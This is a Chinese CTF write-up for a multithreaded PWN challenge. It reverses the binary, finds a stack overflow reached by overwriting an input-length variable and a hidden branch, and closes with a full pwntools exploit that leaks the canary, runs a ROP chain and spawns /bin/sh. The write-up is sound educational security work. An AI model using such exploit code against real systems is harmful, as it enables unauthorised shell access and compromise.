---
title: 网鼎杯玄武组——PWN2
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458585163&idx=2&sn=12c0163ed68ac4a8788ddfdd5aa55f95&chksm=b18c38c186fbb1d75406c24e89a9948fe9cb28c92ae8ef0a1c325efe0e67510402a28460ba6c&scene=58&subscene=0#rd
source: 看雪学苑
date: 2024-12-03
fetch_date: 2025-10-06T19:40:13.975301
---

# 网鼎杯玄武组——PWN2

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GUopic9zTLLIfcaBhh6yDZ807IlHzzvTCk8IjvQu4SeSG0GV1k0eFZ5Thpyox9yY8xLKZ7NJoEnjw/0?wx_fmt=jpeg)

# 网鼎杯玄武组——PWN2

学计算机睡觉

看雪学苑

玄武组的是一道多线程PWN题，对我来说主要的难点就在于逆向汇编和线程调试了，当天起来感觉非常累还有点头疼？汇编里的漏洞大部分都没有发现，简直逆不了一点。后面复现了这道题，还是能学到挺多东西的，所以还是记录一下吧。

**01**

**逆向**

题目给的附件一开始就没有符号表，那找main函数就只能从start函数中找了，这里已经重新命名函数了。

```
void __fastcall __noreturn main(int a1, const char **a2)
{
  const char **v2; // rdx

  sub_4017B5();
  tip2();
  main_main(a1, a2, v2);
}
```

## tip2

sub\_4017B5函数是正常的初始话，我们不用管它，先直接看tip2函数。Creat\_process中其实就是调用sys\_vfork()函数创建一个子进程。

这里需要注意的是创建了子进程之后程序是先跑子进程的，子进程结束之后再跑父进程。在子进程中sys\_vfork()函数返回的是0，父进程是进程号。所以if ( fork\_ret )里的代码是父进程跑的，因此子进程略过tip2剩下的内容直接跑main\_main了

```
unsigned __int64 tip2()
{
  unsigned __int64 result; // rax
  int fork_ret; // [rsp+Ch] [rbp-24h]
  char v2[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  fork_ret = Creat_process();
  if ( fork_ret < 0 )                           // 创建子进程失败
    exit();
  if ( fork_ret )                               // 这个是在父进程中执行的
  {
    sub_44ED00((unsigned int)fork_ret, 0LL, 0LL);
    onput_2((__int64)"Wanna return?");
    input(0, v2, 1uLL);
    onput_2((__int64)"It's impossible");
    exit_ma(0);
  }
  result = v3 - __readfsqword(0x28u);
  if ( result )
    sub_4525B0();
  return result;
}
```

## 子进程

### main\_main

给了gift(地址)，然后就让你往V4输入0x40个字节(溢出不了)，最后进入exit\_ma(0);

```
int __fastcall __noreturn main_main(int argc, const char **argv, const char **envp)
{
  char v3; // cl
  char v4[72]; // [rsp+0h] [rbp-50h] BYREF
  unsigned __int64 v5; // [rsp+48h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  onput((unsigned int)"gift: %p\n", v5, (_DWORD)envp, v3);
  onput_2((__int64)"leave your name");
  input(0, v4, 0x40LL);
  exit_ma(0);
}
```

### exit\_ma(0)

\_\_halt使程序进入休眠状态，到这里子进程就结束了。

```
void __fastcall __noreturn sub_44EE30(int a1)
{
  unsigned __int64 v1; // rax
  unsigned int v2; // r8d
  unsigned __int64 v3; // rax
  unsigned int v4; // r8d

  v3 = sys_exit_group(a1);                      // exit(2)
  if ( v3 > 0xFFFFFFFFFFFFF000LL )
    __writefsdword(v4, -(int)v3);
  v1 = sys_exit(a1);
  if ( v1 > 0xFFFFFFFFFFFFF000LL )
    __writefsdword(v2, -(int)v1);
  __halt();                                     // 使程序进入休眠状态
}
```

## 主进程

子进程结束之后，主进程也和子进程一样从tip2中创建子进程的函数跳转出来，只不过主进程返回的是进程号。

```
fork_ret = Creat_process();
```

因此fork\_ret不为零，所以主进程就执行这个if分支的内容。

```
  if ( fork_ret )
  {
    sub_44ED00((unsigned int)fork_ret, 0LL, 0LL);
    onput_2((__int64)"Wanna return?");
    input(0, v2, 1uLL);
    onput_2((__int64)"It's impossible");
    exit_ma(0);
  }
```

#

##

**02**

**漏洞**

##

## 后门函数

就一循环：先创建子进程然后再往v1输入0x100个数据，虽然sub\_401A55中有exit\_ma(0)函数，但是由于是创建子进程且子进程和主进程是共享内存空间的，所以我们是可以输入两次数据的。

```
void tip()
{
  int v0; // [rsp+Ch] [rbp-114h]
  char v1[264]; // [rsp+10h] [rbp-110h] BYREF
  unsigned __int64 v2; // [rsp+118h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  while ( 1 )
  {
    v0 = Creat_process();
    if ( v0 < 0 )
      break;
    if ( !v0 )
    {
      onput_2((__int64)"once again?");
      input(0, v1, 0x100uLL);
      sub_401A55(v1);
    }
  }
  exit();
}
```

我们通过汇编可以发现，输入的长度是放在[rbp-0x118]的位置，而我们输入的变量v1起始是在[rbp-110h]即在输入长度前面的。那也就是说，我们第一次输入可以修改第二次输入的长度，这里就存在一个栈溢出了。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GUopic9zTLLIfcaBhh6yDZ8mH4jn4QGAtttE2UQNIe4gkVoCgdkNmXTbnicuJhJTPGR6jRMq4sk7SA/640?wx_fmt=jpeg&from=appmsg)

### 跳出循环

即使我们第二次输入利用栈溢出构造出了rop，正常来讲最终还是会执行sub\_401A55函数，跳转不到返回地址，这个时候看反编译已经没有用了，我们在汇编代码中找到了一个没有被反编译的分支，即只要让[rbp+var\_11C]等于0x11111111就可以跳出循环跳转到返回地址了。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GUopic9zTLLIfcaBhh6yDZ8YmnCGVA9dibpN0WXMxTFooKJxJ0uPkoTPibONC6ITUWm7uo51hRzibvCg/640?wx_fmt=jpeg&from=appmsg)

## 跳转到后门函数

同样，看反汇编已经没有用了，我们在tip2中的汇编中可以看到，只要让[rbp+var\_28]等于1就可以绕过exit\_ma(0)分支了ret到后门函数了。虽然一开始不知道会ret到哪里去，但是既然有这个分支了我们就应该动调一下也许就是洞了。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GUopic9zTLLIfcaBhh6yDZ8icwWia1fMIFs5GibjAegCmdkQNkk3R4kwsTtUz4XxnWzPwz5PtV6Ppn8A/640?wx_fmt=jpeg&from=appmsg)

**03**

**多线程动调**

记录一下用到的调试命令

```
查看线程列表：info threads
切换进程：thread ID
```

**04**

**EXP**

```
from pwn import *
io = process("./pwn")
context.log_level = "debug"
elf = ELF("./pwn")

cmd = (
    "thread 2\n"
    "b *0x44EE5C\n"
    "c\n"
)

""" io.recvuntil("gift: ")
addr = int(io.recv(18),16)
print("addr========>",hex(addr)) """

io.recvuntil("gift: ")
canary = int(io.recv(18),16)
print("addr========>",hex(canary))

payload = b"A"*0x28 + b"\x01"
io.sendafter("leave your name",payload)

io.sendafter("Wanna return?",b"1")

io.sendafter("once again?",b"A"*0x100)

rax = 0x0000000000450277
rdi = 0x000000000040213f
rsi = 0x000000000040a1ae
rdx_rbx = 0x0000000000485feb
syscall = 0x000000000041ac26
bss = elf.bss()

payload = b"B"*0x60 + p32(0x11111111) + p32(0x11111111) + p32(0x11111111)
payload = payload.ljust(0x100,b"B")
payload += p64(canary) + p64(canary) + b"A"*0x8
payload += p64(rax) + p64(0x0) + p64(rdi) + p64(0x0) + p64(rsi) + p64(bss) + p64(rdx_rbx) + p64(0x100)*2 + p64(syscall)
payload += p64(rax) + p64(0x3b) + p64(rdi) + p64(bss) + p64(rsi) + p64(0x0) + p64(rdx_rbx) + p64(0x0)*2 + p64(syscall)
io.sendafter("once again?",payload)

io.send(b"/bin/sh")

io.interactive()
```

**05**

**收获**

最近看的几道题反编译都是和汇编有些出入的，所有毫无头绪的时候还是要认真看看汇编代码的，大概总结了两点吧。

◆看有无隐藏的分支

◆看输入长度等一些关键变量是否可以控制

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GUopic9zTLLIfcaBhh6yDZ8vRC4OapgODRrjtgTDyadwosBWaY84kx6TfTCaVTiaficEYInAib9NQDUQ/640?wx_fmt=png&from=appmsg)

看雪ID：学计算机睡觉

*https://bbs.kanxue.com/user-home-962996.htm*

\*本文为看雪论坛优秀文章，由 学计算机睡觉 原创，转载请注明来自看雪社区

# 往期推荐

1、[PWN入门-SROP拜师](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458579476&idx=2&sn=4f9adc1e7d61c7357bdc85ba654f24cb&chksm=b18dc29e86fa4b88c483a581131de043b076918cd7c7436a82e9bb56bc37c8f1edf6c87d8350&scene=21#wechat_redirect)

2、[一种apc注入型的Gamarue病毒的变种](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458579387&idx=1&sn=9d6fbf25f11b3d99c92c5ac8de0587d5&chksm=b18dc13186fa4827ae7a7bf909e0d2b9490c6df4417c1d7eebc27127133daa9771c212b4f310&scene=21#wechat_redirect)

3、[野蛮fuzz：提升性能](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458579145&idx=1&sn=9134327916f678cfe7e2bc3371cedeaf&chksm=b18dc04386fa49557abc8c7e6ce3410dd4042ed88635c48961fda72b7fa4425698e56bb86ff6&scene=21#wechat_redirect)

4、[关于安卓注入几种方式的讨论，开源注入模块实现](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458579138&idx=1&sn=fef09513ae9f594e68a503f69a312f4f&chksm=b18dc04886fa495e440990cd2dbddb24693452562e53bd8cb565063ddee921b7e288477f4eea&scene=21#wechat_redirect)

5、[2024年KCTF水泊梁山-反混淆](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458579017&idx=2&sn=a97dacde8a6c913108999da8a96a667f&chksm=b18dc0c386fa49d57ce9f0ce6923690d6eb8efb3ccb8032e8c6b923184af3dd29b1b4471f9a2&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8GUopic9zTLLIfcaBhh6yDZ8LKj2HT7UwkOMNTFPib0nwVWLTZVKMG9LhH2ZjFmiaMyt30iaae5W4L3oQ/640?wx_fmt=gif&from=appmsg)

**球分享**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8GUopic9zTLLIfcaBhh6yDZ8LKj2HT7UwkOMNTFPib0nwVWLTZVKMG9LhH2ZjFmiaMyt30iaae5W4L3oQ/640?wx_fmt=gif&from=appmsg)

**球点赞**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8GUopic9zTLLIfcaBhh6yDZ8LKj2HT7UwkOMNTFPib0nwVWLTZVKMG9LhH2ZjFmiaMyt30iaae5W4L3oQ/640?wx_fmt=gif&from=appmsg)

**球在看**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8GUopic9zTLLIfcaBhh6yDZ8XyHmwsvpaVnOstLdm642KFGaDMT1ct5EYlrj1DRiaWd6XvibLZysaJ0Q/640?wx_fmt=gif&from=appmsg)

点击阅读原文查看更多

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8EGLfh77kFmnicd9WOic2ibvhCibFdB4bL4srJCgo2wnvdoXLxpIvAkfCmmcptXZB0qKWMoIP8iaibYN2FA/0?wx_fmt=png)

看雪学苑

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/1U...